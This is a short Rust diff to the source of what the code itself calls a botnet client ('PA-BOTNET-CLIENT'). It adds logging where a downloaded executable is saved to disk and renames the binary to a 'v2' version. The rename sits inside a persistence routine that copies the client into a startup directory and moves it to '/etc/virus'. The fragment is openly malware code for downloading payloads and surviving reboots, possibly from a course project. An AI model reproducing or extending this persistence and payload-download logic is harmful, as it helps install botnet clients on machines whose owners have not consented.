@@ -294,6 +294,7 @@ fn check_and_request_executable(
                 Ok(data_file) => {
                     println!("\t\t[+] file data received");
                     
+                    println!("\t\t[+] Storing executable at {:?}", executable_path);
                     let mut file = File::create(&executable_path)?;
                     file.write_all(&data_file)?;
 
@@ -387,7 +388,7 @@ fn persistence() {
     println!("{:?}", output);
 
     let pwd = String::from_utf8_lossy(&output.stdout).trim().to_string();
-    let path = format!("{}/PA-BOTNET-CLIENT", pwd);
+    let path = format!("{}/PA-BOTNET-CLIENT-v2", pwd);
 
 
     // Copie un fichier dans le répertoire de démarrage
@@ -401,7 +402,7 @@ fn persistence() {
 
 
     let output = Command::new("mv")
-        .arg("/etc/PA-BOTNET-CLIENT")
+        .arg("/etc/PA-BOTNET-CLIENT-v2")
         .arg("/etc/virus")
         .output()   
         .expect("Erreur lors de la copie du fichier");
